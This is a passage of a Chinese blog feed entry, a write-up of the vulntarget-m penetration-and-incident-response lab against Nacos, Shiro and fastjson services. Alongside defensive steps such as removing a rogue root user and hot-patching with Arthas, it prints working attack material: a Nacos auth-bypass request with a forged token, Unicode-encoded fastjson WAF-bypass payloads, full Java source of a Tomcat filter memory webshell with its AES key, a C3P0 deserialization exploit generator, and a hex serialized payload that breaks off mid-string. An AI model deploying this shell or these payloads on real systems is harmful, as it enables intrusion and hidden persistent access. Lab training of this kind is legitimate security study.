+
+替换解密后的index.jsp即可恢复
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-m</title>
+    <url>/2024/10/27/vulntarget-m/</url>
+    <content><![CDATA[前言
+拓扑
+
+
+入口机为双网卡，外网可以根据自身情况，设置桥接或nat模式，内网ip固定位192.168.137.20
+内网机02为仅主机模式，ip固定位192.168.137.10，该ip不能变更。
+内网机03为仅主机模式，ip固定位192.168.137.30
+
+三台机子的账号密码均为vulntarget，该密码仅限调试环境使用，并不是给你用来应急的，应急需要从漏洞打进去才能应急
+
+
+注意事项
+
+本次环境vulntarget-m内网靶场主要为内网渗透+应急响应设定，其中应急部分主要涉及java内存马、后门等，因为在靶标中含有多个内存马，所以您在本地使用Vmware复现该环境时，只能够通过回滚快照的方法来重置环境，不能够将环境直接重启，重启会导致内存马失效。
+同样因为内存马的特殊性，可能会导致在攻防时出现一些问题，例如在注入内存马时因为路径问题、类型问题导致的覆盖、冲突等，这时可能需要多次尝试。
+
+环境描述
+
+某公司将自己公司的业务搬到了云上，并存在内网服务，公司运维人员主要通过远程ssh登录入口机，对服务进行日常维护和管理。
+在前段时间，某国外黑客发现该公司的入口机存在漏洞，并入侵了该机器，同时可能入侵了内网系统。
+运维在今日登录维护的时候，发现ssh无法登录，经过排查发现ssh密码目前已经被修改。
+由于环境特殊，暂时无法通过其他的方法对机器进行重置密码，且由于业务的重要性，不能够对服务器进行重启等。
+根据以上条件：
+请利用先攻再应急的特殊思维方法来进行应急。
+
+任务目标
+
+
+对3台机器进行应急排查，对其中可能的后门进行排查
+不能够重启机器（重启则判定应急失败）
+在你认为应急成功之后，请获取对应的flag，并对你获取的flag进行check
+
+信息收集扫描存活主机和端口，发现开放了22、80、7848、8848、9848、9849端口
+
+访问80端口界面如下：
+
+存在一个登录口，经典fastjson靶机界面
+
+然后看7848、8848这几个端口应该就是nacos服务，直接请求8848端口是它的Web控制台如下：
+
+web打点Nacos Hessian 反序列化可利用Nacos身份绕过漏洞登录后台，后台可以得到一些配置信息，如shiro key
+POST /nacos/v1/auth/users/login HTTP/1.1Host: 192.168.230.132:8848User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 31Origin: http://192.168.230.132:8848Connection: closeReferer: http://192.168.230.132:8848/nacos/index.htmlAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjE2OTcyMDU2MDAifQ.TFQnTkHxhNqYlo8c2kuluaoVkEcngSzgS08vjUjJaOsusername=najcos&amp;password=nacjos
+
+
+接着尝试Nacos Hessian 反序列化漏洞利用成功
+java -jar NacosRce.jar http://192.168.230.128:8848/nacos/ 7848 &quot;whoami&quot;
+
+
+
+一、冰蝎内存马： 1、需要设置请求头x-client-data:rebeyond 2、设置Referer:https://www.google.com/ 3、路径随意 4、密码rebeyond
+二、哥斯拉内存马： 1、需要设置请求头x-client-data:godzilla 2、设置Referer:https://www.google.com/ 3、路径随意 4、密码是pass 和 key
+三、CMD内存马： 1、需要设置请求头x-client-data:cmd 2、设置Referer:https://www.google.com/ 3、请求头cmd:要执行的命令
+
+这里有个问题，用冰蝎始终连不上，可能这同时注入内存马出bug了
+
+换成哥斯拉就成功连上了
+
+
+应急响应Ⅰ
+线索：运维在今日登录维护的时候，发现ssh无法登录，经过排查发现ssh密码目前已经被修改。
+
+查看passwd和shadow文件，在passwd文件中可以发现bt用户给出的用户内容格式是个不寻常的格式，通常不会在正常用户中出现（正常的用户应该包含用户名、经过加密的密码哈希值、以及其他相关的用户信息）
+bt:adrla7IBSfTZQ:0:0:eval_to_root:/root:/bin/bash
+
+
+
+接着我们发现异常用户bt曾经登陆过，还是个特权用户
+
+
+于是删除bt用户（回显用户不存在我还以为失败了
+
+应急成功，拿下flag1：flag{6c3742aaf26a6dea7fe9d7731de59517}
+
+who     查看当前登录用户（tty本地登陆  pts远程登录）w       查看系统信息，想知道某一时刻用户的行为uptime  查看登陆多久、多少用户，负载1、查询特权用户特权用户(uid 为0)awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd2、查询可以远程登录的帐号信息awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;4、禁用或删除多余及可疑的帐号usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel user       删除user用户userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除5、root的历史命令histroy6、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令为历史的命令增加登录的IP地址、执行命令时间等信息：1）保存1万条命令sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile2）在/etc/profile的文件尾部添加如下行数配置信息：######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########3）source /etc/profile让配置生效生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile7、历史操作命令的清除：history -c但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。
+
+内网渗透
+代理配置搭建就忽略了~
+
+发现第二张网卡：192.168.137.20
+
+直接上fscan扫，发现存活IP：192.168.137.10和192.168.137.11
+
+接着再单独扫一下这两个IP，两个均开放了22和80端口
+
+
+shiro CB链 反序列化192.168.137.11的80端口访问如下：
+
+抓包测试可以发现请求包的 Set-Cookie 中出现 rememberMe=deleteMe，说明存在shiro框架
+
+在前面nacos的配置文件中可以得到shiro的key
+#权限认证shiro:  enabled: true  set-login-uri: /login  key: KduO0i+zUIMcNNJnsZwU9Q==
+
+直接工具检测一下发现有可利用链
+
+成功注入内存马
+
+
+应急响应Ⅱ查看passwd和shadow文件，同样发现一个可疑用户guest
+
+
+接着再来查看系统日志、登录历史等信息，发现guest用户也在9.26登录过
+
+于是删除guest用户，并且执行get_flag检测失败
+
+接着在/home/vulntarget目录下找到可疑文件app.jar，下载下来反编译看一下即可确认就是这个文件有问题
+
+然后利用工具arthas实现内存马热更新
+首先把jar包反编译导出后，将反编译有问题的地方修改下，再把/bin/sh给改一下让它不能执行
+
+接着分别将arthas-boot.jar和arthas-tunnel-server-3.7.1-fatjar.jar以及编译好后解压得到的UserController.class都上传到/tmp目录下，首次运行会出现如下报错：
+java -jar arthas-boot.jar[ERROR] Can not read arthas version from: https://arthas.aliyun.com/api/latest_version[ERROR] Can not find Arthas under local: /root/.arthas/lib and remote repo mirror: center[ERROR] Unable to download arthas from remote server, please download the full package according to wiki: https://github.com/alibaba/arthas
+
+
+这里需要在本地去执行一下，它会将.arthas保存在用户的隐藏文件下
+
+然后再把它打包上传，由于该靶机没有unzip，我们将其打包成tar包，在/root目录下上传并解压
+tar -cvf arthas.tar .arthastar -xvf arthas.tar
+
+
+
+解压后再去执行就可以成功进入Arthas工具中
+
+最后重新转换已加载的类文件实现热更新，再反编译这个类的源代码，可以发现修改成功了
+retransform /tmp/arthas/UserController.classjad --source-only com.example.shiro550.controller.UserController
+
+
+应急成功，拿下flag2：flag{4b15f4d146ef4c128064f952ba11b874}
+
+fastjson c3p0链 二次序列化接着来看192.168.137.10的就是前面192.168.230.128的web登录页面，探测具体版本发现被拦截了
+
+PS: 前面拿burp的插件直接打bcel没成功应该也是被拦截了的缘故
+
+
+利用Fastjson默认会去除键、值外的空格、\b、\n、\r、\f等特性，并且还会自动将键与值进行unicode与十六进制解码
+
+在fastjson中，当解析json字符串时，它会自动解码Unicode和hex编码字符。因此我们可以尝试利用该特征来实现编码绕过。我们先来尝试将利用报错回显来判断版本号的poc进行Unicode&#x2F;hex编码，可以看到这里抛出异常显示出fastjson版本号1.2.47，说明可以通过Unicode&#x2F;hex编码成功绕过waf
+&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;// 编码前后&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.AutoCloseable&quot;&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;java.lang.AutoCloseable&quot;
+
+
+
+或者拿yakit的插件可以检测到其版本为fastjson 1.2.47
+
+现在已知fastjson版本1.2.47，能打的链子就是bcel、c3p0和common-io链，并且测试可知是不出网的，jndi就不适用了，于是尝试利用Unicode编码绕过来打一下bcel，payload如下，tomcat那里需要换着测试
+
+https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat
+
+&#123; &quot;rand1&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot; &#125;, &quot;rand2&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;rand3&quot;: [&#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassLoader&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$……（内存马）&quot; &#125;,&#123;&quot;$ref&quot;:&quot;$[&#x27;rand3&#x27;].connection&quot;&#125;] &#125;Tomcat 8.0以上，org.apache.tomcat.dbcp.dbcp2.BasicDataSourceTomcat 8.0以下，org.apache.tomcat.dbcp.dbcp.BasicDataSourcecommon-dbcp，org.apache.commons.dbcp.BasicDataSource
+
+但是这个应该是没tomcat打不了bcel
+
+然后common-io链靶机应该也没有那么多依赖（估计实战中才会遇到这种，坑很多），所以就只能打c3p0链了，因此下一步探测存在的依赖，利用Character转换报错可以判断存在何种依赖
+
+参考文章：
+https://xz.aliyun.com/t/12492#toc-3
+https://www.sec-in.com/article/950
+https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/
+
+依赖检测项目
+org.springframework.web.bind.annotation.RequestMapping  //SpringBootorg.apache.catalina.startup.Tomcat  //Tomcatgroovy.lang.GroovyShell  //Groovy - 1.2.80com.mchange.v2.c3p0.DataSources  //C3P0com.mysql.jdbc.Buffer  //mysql-jdbc-5com.mysql.cj.api.authentication.AuthenticationProvider  //mysql-connect-6com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8sun.nio.cs.GBK  //JDK8java.net.http.HttpClient  //JDK11org.apache.ibatis.type.Alias  //Mybatisorg.apache.tomcat.dbcp.dbcp.BasicDataSource  //tomcat-dbcp-7-BCELorg.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8及以后-BCELorg.apache.commons.io.Charsets       // 存在commons-io,但不确定版本org.apache.commons.io.file.Counters  //commons-io-2.7-2.8org.aspectj.ajde.Ajde  //aspectjtools
+
+RequestMapping本身为SpringBoot下的类，当存在该类时会报出类型转换错误，说明为SpringBoot项目
+&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;org.springframework.web.bind.annotation.RequestMapping&quot;    &#125;  &#125;
+
+
+通过这种方法可以验证出存在c3p0依赖
+&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;com.mchange.v2.c3p0.DataSources&quot;    &#125;  &#125;
+
+
+由于目标不出网，因此需要利用TemplatesImpl来加载恶意字节码。为使该恶意类能够被加载，需从AbstractTranslet类继承，并重写他的两个方法，最后将该类编译为.class文件
+
+fastjson不出网回显利用：https://github.com/depycode/fastjson-c3p0
+
+package sec;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.HashMap;import java.util.Map;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import javax.servlet.DispatcherType;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import sun.misc.BASE64Decoder;public class IceShell extends AbstractTranslet implements Filter &#123;    private final String pa = &quot;3ad2fddfe8bad8e6&quot;;    public IceShell() &#123;    &#125;    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        HttpServletRequest request = (HttpServletRequest)servletRequest;        HttpServletResponse response = (HttpServletResponse)servletResponse;        HttpSession session = request.getSession();        Map&lt;String, Object&gt; pageContext = new HashMap();        pageContext.put(&quot;session&quot;, session);        pageContext.put(&quot;request&quot;, request);        pageContext.put(&quot;response&quot;, response);        ClassLoader cl = Thread.currentThread().getContextClassLoader();        if (request.getMethod().equals(&quot;POST&quot;)) &#123;            Class Lclass;            if (cl.getClass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125;            filterChain.doFilter(servletRequest, servletResponse);        &#125;    &#125;    public void destroy() &#123;    &#125;    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map&lt;String, Object&gt; pageContext) &#123;        byte[] bytecode = Base64.getDecoder().decode(&quot;yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT&quot;);        try &#123;            Method define = Lclass.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);            define.setAccessible(true);            Class uclass = null;            try &#123;                uclass = cl.loadClass(&quot;U&quot;);            &#125; catch (ClassNotFoundException var18) &#123;                uclass = (Class)define.invoke(cl, bytecode, 0, bytecode.length);            &#125;            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);            constructor.setAccessible(true);            Object u = constructor.newInstance(this.getClass().getClassLoader());            Method Um = uclass.getDeclaredMethod(&quot;g&quot;, byte[].class);            Um.setAccessible(true);            String k = &quot;3ad2fddfe8bad8e6&quot;;            session.setAttribute(&quot;u&quot;, k);            Cipher c = Cipher.getInstance(&quot;AES&quot;);            c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));            byte[] eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));            Class eclass = (Class)Um.invoke(u, eClassBytes);            Object a = eclass.newInstance();            Method b = eclass.getDeclaredMethod(&quot;equals&quot;, Object.class);            b.setAccessible(true);            b.invoke(a, pageContext);        &#125; catch (Exception var19) &#123;        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    static &#123;        try &#123;            String name = &quot;AutomneGreet&quot;;            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();            Field Configs = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;filterConfigs&quot;);            Configs.setAccessible(true);            Map filterConfigs = (Map)Configs.get(standardContext);            if (filterConfigs.get(&quot;AutomneGreet&quot;) == null) &#123;                Filter filter = new IceShell();                FilterDef filterDef = new FilterDef();                filterDef.setFilter(filter);                filterDef.setFilterName(&quot;AutomneGreet&quot;);                filterDef.setFilterClass(filter.getClass().getName());                standardContext.addFilterDef(filterDef);                FilterMap filterMap = new FilterMap();                filterMap.addURLPattern(&quot;/shell&quot;);                filterMap.setFilterName(&quot;AutomneGreet&quot;);                filterMap.setDispatcher(DispatcherType.REQUEST.name());                standardContext.addFilterMapBefore(filterMap);                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);                constructor.setAccessible(true);                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);                filterConfigs.put(&quot;AutomneGreet&quot;, filterConfig);            &#125;        &#125; catch (Exception var10) &#123;        &#125;    &#125;&#125;
+
+最终exp如下：
+package sec;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class C3P0 &#123;    public static void main(String[] args) throws Exception &#123;        String hex2 = bytesToHex(tobyteArray(gen()));        String FJ1247 = &quot;&#123;\n&quot; +                &quot;    \&quot;a\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +                &quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +                &quot;    &#125;,\n&quot; +                &quot;    \&quot;b\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +                &quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot; + hex2 + &quot;;\&quot;,\n&quot; +                &quot;    &#125;\n&quot; +                &quot;&#125;\n&quot;;        System.out.println(FJ1247);    &#125;    //FastJson原生反序列化加载恶意类字节码    public static Object gen() throws Exception &#123;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CodeAudit\\project\\fastjson\\target\\classes\\sec\\IceShell.class&quot;)); // 读取其中字节即可        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setValue(templates, &quot;_name&quot;, &quot;1&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&quot;val&quot;,jsonArray);        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        return hashMap;    &#125;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    //将类序列化为字节数组    public static byte[] tobyteArray(Object o) throws IOException &#123;        ByteArrayOutputStream bao = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bao);        oos.writeObject(o);   //        return bao.toByteArray();    &#125;    //字节数组转十六进制    public static String bytesToHex(byte[] bytes) &#123;        StringBuffer stringBuffer = new StringBuffer();        for (int i = 0; i &lt; bytes.length; i++) &#123;            String hex = Integer.toHexString(bytes[i] &amp; 0xff);      //bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间            if (hex.length()&lt;2)&#123;                stringBuffer.append(&quot;0&quot; + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误            &#125;else &#123;                stringBuffer.append(hex);            &#125;        &#125;        return stringBuffer.toString();    &#125;&#125;
+
+运行exp即可生成一段json数据：
+&#123;    &quot;a&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,        &quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000024e4cafebabe0000003401870a005e00cb0800cc09004b00cd0700ce0700cf0b000400d00700d10a000700cb08007e0b004900d208007a08007c0a00d300d40a00d300d50b000400d60800d70a00d800d90a002400da0a001c00db0a001c00dc0800dd0a004b00de0b00df00e00a00e100e20800e30a00e400e50800e60700e70700a30900e800e90a001c00ea0a00eb00ec0800ed0a002700ee0700ef0700f00a00e800f10a00eb00f20700f30a001c00f40a00f500ec0a001c00f60a00f500f70800f808009c0b00f900fa0800fb0a00fc00fd0700fe0a00d800ff0a003101000a00fc01010701020a003500cb0b000401030a010401050a003501060a00fc01070a001c010808010907010a08010b07010c0a003f010d0b010e010f0701100801110a001c01120800c80a001c01130a011400ec0a011401150701160b004901150701170a004b00cb0701180a004d00cb0a004d01190a004d011a0a004d011b0a0042011c07011d0a005300cb08011e0a0053011f0a0053011a09012001210a012001220a005301230a0042012407012507012607012707012801000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c7365632f4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e73070129010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011707012a07012b07012c0700ce0700cf07012d0701160700f30700e707012e01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f646507012f0700ef07010a0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701300100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572